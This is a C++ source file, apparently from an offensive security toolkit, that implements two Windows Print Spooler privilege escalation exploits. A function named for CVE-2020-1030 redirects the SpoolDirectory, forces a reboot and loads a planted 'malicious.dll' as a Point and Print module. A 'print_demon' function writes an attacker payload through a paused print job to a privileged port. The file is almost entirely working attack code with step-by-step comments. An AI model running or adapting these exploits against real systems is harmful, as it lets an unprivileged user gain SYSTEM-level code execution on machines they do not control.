#include "exploits.h"

#include <Windows.h>
#include <iostream>
#include <string>

#include "utils.h"
#include "printers.h"

using std::endl; 
using std::cout; 
using std::string; 

/*
	1. set the SpoolDirectory of the printer to C:\\Windows\System32\spool\drivers\x64\4
	2. once the spooling service is restarted, the directory is created. Being a SpoolDirectory is set to be writeable by all users (only if it is created, if it already exits, then its permissions are not changed)
	3. so we need to force the spooling service to restart, in our case we restart the computer and register the app to be called by the OS 
	4. once the service is restarted, and the C:\\Windows\System32\spool\drivers\x64\4 directory created, we can copy the malicious.dll inside that directory
	5. setting C:\\Windows\System32\spool\drivers\x64\4\malicious.dll as PointAndPrint DLL, it will be loaded: DONE!

	malicious.dll, imitating as a Point and Print DLL, must export the SpoolerCopyFileEvent function.
	This function is called once the module is loaded into the process.
*/


void cve_2020_1030(wchar_t* printerName, wchar_t* filePath, bool isRestarted) {

	wchar_t* v4DriverDir = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4");
	HANDLE hPrinter = OpenPrinter(printerName);
	DWORD cbData, dwStatus;

	if (isRestarted) {
		// check if v4 driver directory has been correctly created 
		if (!doesDirExists(v4DriverDir)) {
			cout << "[-] v4 directory not created" << endl;
			return;
		}
		cout << "[+] v4 directory successfully created" << endl;

		// move cve_2020_1030.dll inside that directory 
		wchar_t* newFilePath = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4\\cve_2020_1030.dll"),
			* newFileName = const_cast<wchar_t*>(L"cve_2020_1030.dll"); 

		if (!MoveFile(filePath, newFilePath)) {
			cout << "[-] Error while copying the DLL inside v4 directory" << endl;
			return;
		}
		cout << "[+] DLL correctly copied inside v4 directory" << endl;

		// set the cve_2020_1030.dll as PointAndPrint DLL 	
		cbData = ((DWORD)wcslen(newFileName) + 1) * sizeof(WCHAR);
		dwStatus = SetPrinterDataEx(hPrinter, L"CopyFiles\\Payload", L"Module", REG_SZ, (LPBYTE)newFileName, cbData);

		if (dwStatus != ERROR_SUCCESS) {
			cout << "[-] Error while setting the PointAndPrint DLL" << dwStatus << endl;
			return;
		}
		cout << "[+] PointAndPrint DLL correctly set" << endl;

	}
	else {
		cbData = ((DWORD)wcslen(v4DriverDir) + 1) * sizeof(WCHAR); // size of the value 
		dwStatus = SetPrinterDataEx(hPrinter, L"\\", L"SpoolDirectory", REG_SZ, (LPBYTE)v4DriverDir, cbData);

		if (dwStatus != ERROR_SUCCESS) {
			cout << "[-] Error while setting SpoolDirectory to v4: " << dwStatus << endl;
			return;
		}
		cout << "[+] SpoolDirectory correctly set to v4" << endl;

		// restart the spooling service (and the system) to create the SpoolDirectory
		BOOL result = registerApplicationAndRestartSystem();
	}

	ClosePrinter(hPrinter);
}

/*
	1. driver Generic / Text Only
	2. port pointing to a privileged location of the file system
	3. create printer with the previous driver and port
	4. start printing inside the port
	5. pause the printing job
	6. reboot & see
*/
void print_demon(wchar_t* printerName, std::string payload, bool isRestarted) {
	
	if (!isRestarted) {
		HANDLE hPrinter = OpenPrinter(printerName);

		// start the printing job 
		DOC_INFO_1 docInfo;
		docInfo.pDatatype = const_cast<wchar_t*>(L"RAW");
		docInfo.pOutputFile = NULL;
		docInfo.pDocName = const_cast<wchar_t*>(L"Document");
		DWORD jobID = StartDocPrinter(hPrinter, 1, (LPBYTE)&docInfo);

		if (jobID == 0) {
			cout << "[-] Impossible to start the printing job" << endl;
			return;
		}
		cout << "[+] Printing job correctly started, with ID: " << jobID << endl;

		DWORD dwNeeded = (DWORD)strlen(payload.c_str());
		char* pText = const_cast<char*>(payload.c_str());
		if (!WritePrinter(hPrinter, pText, dwNeeded, &dwNeeded)) {
			cout << "[-] Error while requesting to print inside the job" << endl;
			return;
		}
		cout << "[+] Correctly started to print" << endl;
		EndDocPrinter(hPrinter);

		if (!SetJob(hPrinter, jobID, 0, NULL, JOB_CONTROL_PAUSE)) {
			cout << "[-] Error while pausing the printing job, error: " << GetLastError() << endl;
			return;
		}
		cout << "[+] Correctly paused the job" << endl;

		registerApplicationAndRestartSystem();
	}
	else {
		// unpause the printing job
		HANDLE hPrinter = OpenPrinter(printerName);
		JOB_INFO_1* pJobInfo = NULL;
		DWORD dwNeeded, dwReturned;

		//Get amount of memory needed
		if (!EnumJobs(hPrinter, 0, 1, 1, NULL, 0, &dwNeeded, &dwReturned)) {
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
				cout << "[-] Error while obtaining memory necessary to enumerate printing jobs, error: " << GetLastError() << endl;
				return;
			}
		}
		cout << "[+] Successfully obtained memory necessary, " << dwNeeded << "\t" << dwReturned << endl;

		//Allocate the memory
		pJobInfo = (JOB_INFO_1*)malloc(dwNeeded);
		if (!EnumJobs(hPrinter, 0, 1, 1, (LPBYTE)pJobInfo, dwNeeded, &dwNeeded, &dwReturned)) {
			cout << "[-] Error while obtaining first element of the queue, error: " << GetLastError() << endl;
			return;
		}
		if (pJobInfo == NULL) {
			cout << "[-] Job Info pointer is still NULL" << endl;
			return;
		}
		cout << "[+] Successfully obtained first element of the queue, id: " << pJobInfo[0].JobId << endl;

		if (SetJob(hPrinter, pJobInfo[0].JobId, 0, NULL, JOB_CONTROL_RESUME)) {
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
				cout << "[-] Error while resuming the print job, error: " << GetLastError() << endl;
				return;
			}
		}

		cout << "[+] Restarted printing job" << endl;
	}
}